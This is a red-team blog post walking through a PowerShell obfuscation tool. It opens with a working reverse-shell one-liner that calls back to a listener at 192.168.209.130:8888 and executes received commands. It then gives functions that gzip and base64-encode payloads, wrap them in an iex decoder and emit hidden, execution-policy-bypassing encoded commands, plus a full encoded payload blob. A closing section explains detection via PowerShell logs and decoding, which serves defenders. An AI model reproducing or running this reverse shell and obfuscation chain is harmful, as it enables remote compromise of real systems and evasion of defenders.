---
title: Obfuscating PowerShell scripts and commands
published: true
layout: post
tags:
 - offsec
---

**GitHub Repository**: [https://github.com/gh0x0st/Invoke-PSObfuscation](https://github.com/gh0x0st/Invoke-PSObfuscation)

As PowerShell continues to evolve over the years, integrating itself into the inner workings of the Windows Operating System, so has its ability to be utilized by Red Teams. Although it's not a new concept by any means; it's a well-known fact that fileless malware is still up and coming and while it's possible to detect it, the ability to utilize the techniques they leverage will likely not be going anywhere for a long time, if ever. 

As a member of a red team, this can work to your advantage. One caveat to online platforms such as HackTheBox, although great to hone your skills, do not expose you actual defenses, such as an active blue team trying to stop you, anti-virus interference, or a SIEM alerting sysadmins to your presence. This can create bad habits and manifest a  false sense of security by leaving your payloads and enumeration scripts exposed on the machine.

This could be the difference between the blue team eradicating you after a few minutes from finding your leftovers to having a few hours to accomplish your task.

## Sections:
With this article, I'm not going to show you how to be undetectable using PowerShell, however, I will show how you can add multiple layers of encoded/compression obfuscation to your payloads to buy yourself time to complete your task at hand before the Blue Team catches you. The entire script (Invoke-PSObfuscation.ps1) is built around four main sections, which I have broken down into snippets.

1. ConvertTo-ByteArray.ps1
2. ConvertTo-GzipStream.ps1
3. ConvertTo-EncodedGzipStream.ps1
4. ConvertTo-EncodedDecoder.ps1
5. Executable Command
6. Detection

## Step 1 - Payload (ConvertTo-ByteArray.ps1)
Let's look at the following script that will establish a reverse shell from PowerShell to a listener. As a blue team member, if you were to find a script like this, it would be trivial to  determine what was happening, allowing you to know how to respond to the incident. What we're going to do is make this script harder to decipher where the inexperienced eye may not be able to respond as effectively.

```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.209.130',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
We're going to start by converting our payload into a byte array so that we can pass it to the GzipStream class. We can either convert a one line command, or the contents of an entire script. In this case, we're going to save the reverse shell code to a script called revshell.ps1.

![Alt text](https://github.com/gh0x0st/Invoke-PSObfuscation/blob/master/Screenshots/Function_1.png?raw=true "Function 1")

```powershell
Function ConvertTo-ByteArray()
{
	[cmdletBinding()]
	Param (
		[Parameter(Position = 0, Mandatory = $false, ParameterSetName = 'String')]
		[System.String]$String,
		[Parameter(Position = 1, Mandatory = $false, ParameterSetName = 'File Content')]
		[ValidateScript({ Test-Path $_ })]
		[System.String]$Path
	)
	Process
	{
        switch ($PsCmdlet.ParameterSetName)
        {
            	"String" {$Content = $String}
            	"File Content" {$Content = [System.IO.File]::ReadAllLines( ( Resolve-Path $Path ) )}
        }
		$Encoding = [System.Text.Encoding]::ASCII
		$Output = $Encoding.GetBytes($Content)
	}
	End
	{
		return $Output
	}
}
```

## Step 2 - Compress (ConvertTo-GzipStream.ps1)
We can now satisfy the requirements of the GzipStream class, which requires us to pass a byte array. This adds a new level of complexity of our payload by further mutating it from our initial payload, plus it'll be slightly smaller, but that space gained will likely be lost with the final step. 

![Alt text](https://github.com/gh0x0st/Invoke-PSObfuscation/blob/master/Screenshots/Function_2.png?raw=true "Function 2")

```PowerShell
Function ConvertTo-GzipStream()
{
	[cmdletBinding()]
	Param (
		[byte[]]$ByteArray
	)
	Process
	{
        	$MemoryStream = New-Object System.IO.MemoryStream
        	$GzipStream = New-Object System.IO.Compression.GzipStream $MemoryStream, ([System.IO.Compression.CompressionMode]::Compress)
        	$GzipStream.Write( $ByteArray, 0, $ByteArray.Length )
        	$GzipStream.Close()
        	$MemoryStream.Close()
        	$Output = $MemoryStream.ToArray()
	}
	End
	{
		return $Output
	}
}
```
## Step 3 - Encode Stream (ConvertTo-EncodedGzipStream.ps1)
Now that we gotten our compressed stream, we're going to add our next level of complexity by encoding the compressed stream itself. This is a very simple step where we're just going to pass our GzipStream byte array to the Base64 Encoder. It's trivial to decode Base64, however, after you encode a compressed stream, find an online decoder and see what it looks like. If you've encountered these before, you may know how to proceed, but the results can be intimidating and you may feel like you did something wrong, buying the red team time.

![Alt text](https://github.com/gh0x0st/Invoke-PSObfuscation/blob/master/Screenshots/Function_3.png?raw=true "Function 3")

```PowerShell
Function ConvertTo-EncodedGzipStream()
{
	[cmdletBinding()]
	Param (
		[byte[]]$GzipStream
	)
	Process
	{  
        	$Output = [System.Convert]::ToBase64String($GzipStream)
	}
	End
	{
		return $Output
	}
}
```
## Step 4 - Encode Decoder (ConvertTo-EncodedDecoder.ps1)
One way or another, obfuscated code needs to be executed. Within this step, I've included a very simple one-liner that will decode the encoded compressed stream, decompress the stream and execute the payload. It's not that complicated, and the code itself could be obfuscated with redundant code, but I'll leave that up to you.

If you're a blue team member and you're reading this and you're not familiar with this level of complexity, keep reading, I'll show you to decode the obfuscated reverse shell proof of concept made by this script.

![Alt text](https://github.com/gh0x0st/Invoke-PSObfuscation/blob/master/Screenshots/Function_4.png?raw=true "Function 4")
```PowerShell
Function ConvertTo-EncodedDecoder()
{
	[cmdletBinding()]
	Param (
		[System.String]$EncodedGzipStream
	)
	Process
	{
		[System.String]$Decoder = '$Decoded = [System.Convert]::FromBase64String("<Base64>");$ms = (New-Object System.IO.MemoryStream($Decoded,0,$Decoded.Length));iex(New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).readtoend()'
		[System.String]$Decoder = $Decoder -replace "<Base64>", "$EncodedGzipStream"
		[byte[]]$bytes = [System.Text.Encoding]::Unicode.GetBytes($Decoder)
		[System.String]$Output = [Convert]::ToBase64String($bytes)
	}
	End
	{
		return $Output
	}
}
```
## Step 5 - Executable Command
All this work has led to this point, where you've given the command to actually run your code. This will vary, but in the case of the reverse shell, as a red teamer, you do not want to leave a terminal open where the blue team, or user can find to ruin your efforts if you haven't migrated to a different process. 

The Invoke-PSObfuscation function will take your encoded decoder, which includes your encoded GzipStream, and outputs in a command you run AD-HOC. Keep in mind that SIEM solutions that are worth their salt are starting to look for these parameters in the logs and may trigger alerts. 

* -NoP - (-NoProfile) - Does not load the Windows PowerShell profile.)
* -NonI - (-NonInteractive) - Does not present an interactive prompt to the user.
* -W Hidden (-WindowStyle) - Sets the window style to Normal, Minimized, Maximized or Hidden.
* -Exec Bypass (-ExecutionPolicy) - Sets the default execution policy for the current session and saves it
    in the $env:PSExecutionPolicyPreference environment variable.
    This parameter does not change the Windows PowerShell execution policy
    that is set in the registry.
* -Enc (-EncodedCommand) - Accepts a base-64-encoded string version of a command. Use this parameter
    to submit commands to Windows PowerShell that require complex quotation
    marks or curly braces.

![Alt text](https://github.com/gh0x0st/Invoke-PSObfuscation/blob/master/Screenshots/Function_5.png?raw=true "Function 5")

## Usage
~~~PowerShell
PS C:\> . .\Invoke-PSObfuscation.ps1
PS C:\> Invoke-PSObfuscation -Path C:\revshell.ps1     
powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand '...EncodedOutput....'

PS C:\> . .\Invoke-PSObfuscation.ps1
PS C:\> Invoke-PSObfuscation -String '([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")'
powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand '...EncodedOutput....'
~~~

## Step 6 - Detection
While this is catered to mostly benefit the red team, I’m going to show the blue a little bit of love here with a very simple introduction into detecting these scripts and reverse engineering. There's just one point I want to stress:

* Configure yourself a virtual machine without a network adapter and snapshots

You do not want to be in the position where you accidentally execute the wrong code and end up infecting your machine. There is a time and place to execute malicious code when reverse engineering, but on the production network with valid credentials is not the place.

**_Logs_**

This is simple, monitor your logs! With Windows 10, you can find the PowerShell event log file %SystemRoot%\System32\Winevt\Logs\Windows PowerShell.evtx and through eventvwr you'll find it as Applications and Services Logs/Windows PowerShell. Take a moment to run through the script, execute it and look at the what the system appended to this log. 

![Alt text](https://github.com/gh0x0st/Invoke-PSObfuscation/blob/master/Screenshots/Log_Snippet.png?raw=true "Log Snippet")

Well, there’s our entire command! Depending on your script, this strategy executes in memory and leaves little, if any physical trace, hence 'fileless'. If you have log monitoring available, this is likely going to be your only physical trace if they haven’t been purged. Make sure your monitoring solution is configured to look at this log and have it trigger when HostApplication contains any of these parameters, in any order and is case insensitive (this includes the full name). You generally will not encounter legit processes that utilize Encoded Commands so they should be investigated immediately if you were not expecting it.

-NoP -NonI -W Hidden -Exec Bypass -Enc

**_Decoding_**

Now that you're being alerted when commands like this are being executed and know how you can obtain the initial command, we can work on breaking it down. These steps will not be the same in every situation, as obfuscation can vary. I'll show you the steps on how you can decode the obfuscated reverse shell script created by this process.

First you need to obtain the command you were alerted to:
```PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc 'JABEAGUAYwBvAGQAZQBkACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEARQAxAFIAWAAyAHYAQwBNAEIARAAvAEsAdgBmAFEAcgBRAG0AegBvAGUAMQBRADEARABKAGgASwA5AHMAUQBoAHMAbwBxADcARQBGADgAaQBPADEAaABNADIAcwBWAGUANgBLAGkAZgB2AGMAbAByAGUAMwBNAHkAeAAzAEgANwA5ADkAZAByAEQAaABUAG0AQgBPADgAdwBBAGcAUAB6AG4AagB4AGkAegBGAEIAZABDAG8ASQAxADIASwBFAEoASwBKAE4AdgBFAEkAcQB4AEQAUwBjAGgAQwBXAFMAMgBWADcAUABGADEANgBuAEsAMwB5ADMASgA3AHgAbgAxADIANQAxADkAZQBPAEIAVgBkAEEATwA1AFYAbwByAFcAWgBXAG0AKwBFAFMASwB5AGgAbgBqAHcAVwB4AHgASQBwAHoATgA1ADUAYQBwAGgAUQBhADUAUQBuAFQAYQA3AGUAZgAyADUAZQBIAHMAWABvAE4ARABxAGoASgBrAHoARgBLAEcAWABnAG0ASgBiADUAUQBKAHEALwBBAHQAYwBGAHQAUQB0AGUASQBMADgAeQBXAGwAbgBJAE8AVABJADcAagA4AEgARgBpAEoASgBLAGwANQA3AEcANABEAFoAMwByAGEANABrAGkAdQBzAGQANQBsAGkAawBjAFMAcgAxAEUANABIAEwANwBuADgAUwBaAFIAKwBaAEwAZgA4AHUAbQAyAGQAagBFAG0AeQBtAHkAQwBlAGIASwBRADgAYwBxAEkASwBqAHgAQwA1AGUAQQBQAEgAagAyADQAdwBIAGgAUABUAGsAVwBEAE8ANgBnAFAAWgBmAEsAYQArAEEAVAAyAEoAQQBKAGIAVgA3AFkAOQBKAEYAeABNAEoASwBWAG0ATwBBAEQANwB4AHQARwBHAFIAbgA1AEcASgBoAGoAZQBNAHMAMwA3AC8AVABKAGoAbQBlADMATgBaAEcATAAvAEQAcwAyAEoAeABjADkATwBFAGIASgBHAFIAKwBkAHUAKwB2AG8AOABEAGYAWQBqADIAeABjAHAANAA5AGUAZwAvAHAAVQB3ADIAeABUAEkAKwBCADkAOABPAGkAMwBTACsAUQBFAEEAQQBBAD0APQAiACkAOwAkAG0AcwAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAJABEAGUAYwBvAGQAZQBkACwAMAAsACQARABlAGMAbwBkAGUAZAAuAEwAZQBuAGcAdABoACkAKQA7AGkAZQB4ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAFoAaQBwAFMAdAByAGUAYQBtACgAJABtAHMALAAgAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AcgBlAGEAZAB0AG8AZQBuAGQAKAApAA=='
```

Next you need to take out everything except for the encoded string, as that's what PowerShell is executing:
```
'JABEAGUAYwBvAGQAZQBkACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEARQAxAFIAWAAyAHYAQwBNAEIARAAvAEsAdgBmAFEAcgBRAG0AegBvAGUAMQBRADEARABKAGgASwA5AHMAUQBoAHMAbwBxADcARQBGADgAaQBPADEAaABNADIAcwBWAGUANgBLAGkAZgB2AGMAbAByAGUAMwBNAHkAeAAzAEgANwA5ADkAZAByAEQAaABUAG0AQgBPADgAdwBBAGcAUAB6AG4AagB4AGkAegBGAEIAZABDAG8ASQAxADIASwBFAEoASwBKAE4AdgBFAEkAcQB4AEQAUwBjAGgAQwBXAFMAMgBWADcAUABGADEANgBuAEsAMwB5ADMASgA3AHgAbgAxADIANQAxADkAZQBPAEIAVgBkAEEATwA1AFYAbwByAFcAWgBXAG0AKwBFAFMASwB5AGgAbgBqAHcAVwB4AHgASQBwAHoATgA1ADUAYQBwAGgAUQBhADUAUQBuAFQAYQA3AGUAZgAyADUAZQBIAHMAWABvAE4ARABxAGoASgBrAHoARgBLAEcAWABnAG0ASgBiADUAUQBKAHEALwBBAHQAYwBGAHQAUQB0AGUASQBMADgAeQBXAGwAbgBJAE8AVABJADcAagA4AEgARgBpAEoASgBLAGwANQA3AEcANABEAFoAMwByAGEANABrAGkAdQBzAGQANQBsAGkAawBjAFMAcgAxAEUANABIAEwANwBuADgAUwBaAFIAKwBaAEwAZgA4AHUAbQAyAGQAagBFAG0AeQBtAHkAQwBlAGIASwBRADgAYwBxAEkASwBqAHgAQwA1AGUAQQBQAEgAagAyADQAdwBIAGgAUABUAGsAVwBEAE8ANgBnAFAAWgBmAEsAYQArAEEAVAAyAEoAQQBKAGIAVgA3AFkAOQBKAEYAeABNAEoASwBWAG0ATwBBAEQANwB4AHQARwBHAFIAbgA1AEcASgBoAGoAZQBNAHMAMwA3AC8AVABKAGoAbQBlADMATgBaAEcATAAvAEQAcwAyAEoAeABjADkATwBFAGIASgBHAFIAKwBkAHUAKwB2AG8AOABEAGYAWQBqADIAeABjAHAANAA5AGUAZwAvAHAAVQB3ADIAeABUAEkAKwBCADkAOABPAGkAMwBTACsAUQBFAEEAQQBBAD0APQAiACkAOwAkAG0AcwAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAJABEAGUAYwBvAGQAZQBkACwAMAAsACQARABlAGMAbwBkAGUAZAAuAEwAZQBuAGcAdABoACkAKQA7AGkAZQB4ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAFoAaQBwAFMAdAByAGUAYQBtACgAJABtAHMALAAgAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AcgBlAGEAZAB0AG8AZQBuAGQAKAApAA=='
```

Now we need to figure how out to decode this string. If you haven't seen this before, you may not know that this is Base64 encoded. Always look at the help files, as they will tell you nearly everything you need to know. In this case, if you run ```powershell /?```, it'll show you examples on how to use the EncodedCommand parameter, in this case, specifically a Base64 string:

![Alt text](https://github.com/gh0x0st/Invoke-PSObfuscation/blob/master/Screenshots/Help_Snippet.png?raw=true "Help Snippet")

When you use the ```[System.Convert]::FromBase64String('')``` method alone, you're only going to get a byte array in return, this isn't helpful and adding a level of complexity we don't need:

```PowerShell
PS C:\> $String = [System.Convert]::FromBase64String('JABEAGUAYwBvAGQAZQBkACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEARQAxAFIAWAAyAHYAQwBNAEIARAAvAEsAdgBmAFEAcgBRAG0AegBvAGUAMQBRADEARABKAGgASwA5AHMAUQBoAHMAbwBxADcARQBGADgAaQBPADEAaABNADIAcwBWAGUANgBLAGkAZgB2AGMAbAByAGUAMwBNAHkAeAAzAEgANwA5ADkAZAByAEQAaABUAG0AQgBPADgAdwBBAGcAUAB6AG4AagB4AGkAegBGAEIAZABDAG8ASQAxADIASwBFAEoASwBKAE4AdgBFAEkAcQB4AEQAUwBjAGgAQwBXAFMAMgBWADcAUABGADEANgBuAEsAMwB5ADMASgA3AHgAbgAxADIANQAxADkAZQBPAEIAVgBkAEEATwA1AFYAbwByAFcAWgBXAG0AKwBFAFMASwB5AGgAbgBqAHcAVwB4AHgASQBwAHoATgA1ADUAYQBwAGgAUQBhADUAUQBuAFQAYQA3AGUAZgAyADUAZQBIAHMAWABvAE4ARABxAGoASgBrAHoARgBLAEcAWABnAG0ASgBiADUAUQBKAHEALwBBAHQAYwBGAHQAUQB0AGUASQBMADgAeQBXAGwAbgBJAE8AVABJADcAagA4AEgARgBpAEoASgBLAGwANQA3AEcANABEAFoAMwByAGEANABrAGkAdQBzAGQANQBsAGkAawBjAFMAcgAxAEUANABIAEwANwBuADgAUwBaAFIAKwBaAEwAZgA4AHUAbQAyAGQAagBFAG0AeQBtAHkAQwBlAGIASwBRADgAYwBxAEkASwBqAHgAQwA1AGUAQQBQAEgAagAyADQAdwBIAGgAUABUAGsAVwBEAE8ANgBnAFAAWgBmAEsAYQArAEEAVAAyAEoAQQBKAGIAVgA3AFkAOQBKAEYAeABNAEoASwBWAG0ATwBBAEQANwB4AHQARwBHAFIAbgA1AEcASgBoAGoAZQBNAHMAMwA3AC8AVABKAGoAbQBlADMATgBaAEcATAAvAEQAcwAyAEoAeABjADkATwBFAGIASgBHAFIAKwBkAHUAKwB2AG8AOABEAGYAWQBqADIAeABjAHAANAA5AGUAZwAvAHAAVQB3ADIAeABUAEkAKwBCADkAOABPAGkAMwBTACsAUQBFAEEAQQBBAD0APQAiACkAOwAkAG0AcwAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAJABEAGUAYwBvAGQAZQBkACwAMAAsACQARABlAGMAbwBkAGUAZAAuAEwAZQBuAGcAdABoACkAKQA7AGkAZQB4ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAFoAaQBwAFMAdAByAGUAYQBtACgAJABtAHMALAAgAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AcgBlAGEAZAB0AG8AZQBuAGQAKAApAA==')

PS C:\> $String.GetType()

IsPublic IsSerial Name                                     BaseType                                                                                      
-------- -------- ----                                     --------                                                                                      
True     True     Byte[]                                   System.Array  
```

There are numerous text encoders, and you need to pay attention to your output. If you use UTF8 in this case, you can see a script, however, it's not readable:

```PowerShell
PS C:\> [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JABEAGUAYwBvAGQAZQBkACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEARQAxAFIAWAAyAHYAQwBNAEIARAAvAEsAdgBmAFEAcgBRAG0AegBvAGUAMQBRADEARABKAGgASwA5AHMAUQBoAHMAbwBxADcARQBGADgAaQBPADEAaABNADIAcwBWAGUANgBLAGkAZgB2AGMAbAByAGUAMwBNAHkAeAAzAEgANwA5ADkAZAByAEQAaABUAG0AQgBPADgAdwBBAGcAUAB6AG4AagB4AGkAegBGAEIAZABDAG8ASQAxADIASwBFAEoASwBKAE4AdgBFAEkAcQB4AEQAUwBjAGgAQwBXAFMAMgBWADcAUABGADEANgBuAEsAMwB5ADMASgA3AHgAbgAxADIANQAxADkAZQBPAEIAVgBkAEEATwA1AFYAbwByAFcAWgBXAG0AKwBFAFMASwB5AGgAbgBqAHcAVwB4AHgASQBwAHoATgA1ADUAYQBwAGgAUQBhADUAUQBuAFQAYQA3AGUAZgAyADUAZQBIAHMAWABvAE4ARABxAGoASgBrAHoARgBLAEcAWABnAG0ASgBiADUAUQBKAHEALwBBAHQAYwBGAHQAUQB0AGUASQBMADgAeQBXAGwAbgBJAE8AVABJADcAagA4AEgARgBpAEoASgBLAGwANQA3AEcANABEAFoAMwByAGEANABrAGkAdQBzAGQANQBsAGkAawBjAFMAcgAxAEUANABIAEwANwBuADgAUwBaAFIAKwBaAEwAZgA4AHUAbQAyAGQAagBFAG0AeQBtAHkAQwBlAGIASwBRADgAYwBxAEkASwBqAHgAQwA1AGUAQQBQAEgAagAyADQAdwBIAGgAUABUAGsAVwBEAE8ANgBnAFAAWgBmAEsAYQArAEEAVAAyAEoAQQBKAGIAVgA3AFkAOQBKAEYAeABNAEoASwBWAG0ATwBBAEQANwB4AHQARwBHAFIAbgA1AEcASgBoAGoAZQBNAHMAMwA3AC8AVABKAGoAbQBlADMATgBaAEcATAAvAEQAcwAyAEoAeABjADkATwBFAGIASgBHAFIAKwBkAHUAKwB2AG8AOABEAGYAWQBqADIAeABjAHAANAA5AGUAZwAvAHAAVQB3ADIAeABUAEkAKwBCADkAOABPAGkAMwBTACsAUQBFAEEAQQBBAD0APQAiACkAOwAkAG0AcwAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAJABEAGUAYwBvAGQAZQBkACwAMAAsACQARABlAGMAbwBkAGUAZAAuAEwAZQBuAGcAdABoACkAKQA7AGkAZQB4ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAFoAaQBwAFMAdAByAGUAYQBtACgAJABtAHMALAAgAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AcgBlAGEAZAB0AG8AZQBuAGQAKAApAA=='))
$ D e c o d e d   =   [ S y s t e m . C o n v e r t ] : : F r o m B a s e 6 4 S t r i n g ( " H 4 s I A A A A A A A E A E 1 R X 2 v C M B D / K v f Q r Q 
m z o e 1 Q 1 D J h K 9 s Q h s o q 7 E F 8 i O 1 h M 2 s V e 6 K i f v c l r e 3 M y x 3 H 7 9 9 d r D h T m B O 8 w A g P z n j x i z F B d C o I 1 2 K 
E J K J N v E I q x D S c h C W S 2 V 7 P F 1 6 n K 3 y 3 J 7 x n 1 2 5 1 9 e O B V d A O 5 V o r W Z W m + E S K y h n j w W x x I p z N 5 5 a p h Q a 5 
Q n T a 7 e f 2 5 e H s X o N D q j J k z F K G X g m J b 5 Q J q / A t c F t Q t e I L 8 y W l n I O T I 7 j 8 H F i J J K l 5 7 G 4 D Z 3 r a 4 k i u s 
d 5 l i k c S r 1 E 4 H L 7 n 8 S Z R + Z L f 8 u m 2 d j E m y m y C e b K Q 8 c q I K j x C 5 e A P H j 2 4 w H h P T k W D O 6 g P Z f K a + A T 2 J A 
J b V 7 Y 9 J F x M J K V m O A D 7 x t G G R n 5 G J h j e M s 3 7 / T J j m e 3 N Z G L / D s 2 J x c 9 O E b J G R + d u + v o 8 D f Y j 2 x c p 4 9 e 
g / p U w 2 x T I + B 9 8 O i 3 S + Q E A A A = = " ) ; $ m s   =   ( N e w - O b j e c t   S y s t e m . I O . M e m o r y S t r e a m ( $ D e c o d e d 
, 0 , $ D e c o d e d . L e n g t h ) ) ; i e x ( N e w - O b j e c t   S y s t e m . I O . S t r e a m R e a d e r ( N e w - O b j e c t   S y s t e m . 
I O . C o m p r e s s i o n . G Z i p S t r e a m ( $ m s ,   [ S y s t e m . I O . C o m p r e s s i o n . C o m p r e s s i o n M o d e ] : : D e c o m 
p r e s s ) ) ) . r e a d t o e n d ( ) 
```

Trying a different encoder, such as Unicode, provides a much cleaner output:

```PowerShell
PS C:\> [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JABEAGUAYwBvAGQAZQBkACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEARQAxAFIAWAAyAHYAQwBNAEIARAAvAEsAdgBmAFEAcgBRAG0AegBvAGUAMQBRADEARABKAGgASwA5AHMAUQBoAHMAbwBxADcARQBGADgAaQBPADEAaABNADIAcwBWAGUANgBLAGkAZgB2AGMAbAByAGUAMwBNAHkAeAAzAEgANwA5ADkAZAByAEQAaABUAG0AQgBPADgAdwBBAGcAUAB6AG4AagB4AGkAegBGAEIAZABDAG8ASQAxADIASwBFAEoASwBKAE4AdgBFAEkAcQB4AEQAUwBjAGgAQwBXAFMAMgBWADcAUABGADEANgBuAEsAMwB5ADMASgA3AHgAbgAxADIANQAxADkAZQBPAEIAVgBkAEEATwA1AFYAbwByAFcAWgBXAG0AKwBFAFMASwB5AGgAbgBqAHcAVwB4AHgASQBwAHoATgA1ADUAYQBwAGgAUQBhADUAUQBuAFQAYQA3AGUAZgAyADUAZQBIAHMAWABvAE4ARABxAGoASgBrAHoARgBLAEcAWABnAG0ASgBiADUAUQBKAHEALwBBAHQAYwBGAHQAUQB0AGUASQBMADgAeQBXAGwAbgBJAE8AVABJADcAagA4AEgARgBpAEoASgBLAGwANQA3AEcANABEAFoAMwByAGEANABrAGkAdQBzAGQANQBsAGkAawBjAFMAcgAxAEUANABIAEwANwBuADgAUwBaAFIAKwBaAEwAZgA4AHUAbQAyAGQAagBFAG0AeQBtAHkAQwBlAGIASwBRADgAYwBxAEkASwBqAHgAQwA1AGUAQQBQAEgAagAyADQAdwBIAGgAUABUAGsAVwBEAE8ANgBnAFAAWgBmAEsAYQArAEEAVAAyAEoAQQBKAGIAVgA3AFkAOQBKAEYAeABNAEoASwBWAG0ATwBBAEQANwB4AHQARwBHAFIAbgA1AEcASgBoAGoAZQBNAHMAMwA3AC8AVABKAGoAbQBlADMATgBaAEcATAAvAEQAcwAyAEoAeABjADkATwBFAGIASgBHAFIAKwBkAHUAKwB2AG8AOABEAGYAWQBqADIAeABjAHAANAA5AGUAZwAvAHAAVQB3ADIAeABUAEkAKwBCADkAOABPAGkAMwBTACsAUQBFAEEAQQBBAD0APQAiACkAOwAkAG0AcwAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAJABEAGUAYwBvAGQAZQBkACwAMAAsACQARABlAGMAbwBkAGUAZAAuAEwAZQBuAGcAdABoACkAKQA7AGkAZQB4ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAFoAaQBwAFMAdAByAGUAYQBtACgAJABtAHMALAAgAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AcgBlAGEAZAB0AG8AZQBuAGQAKAApAA=='))
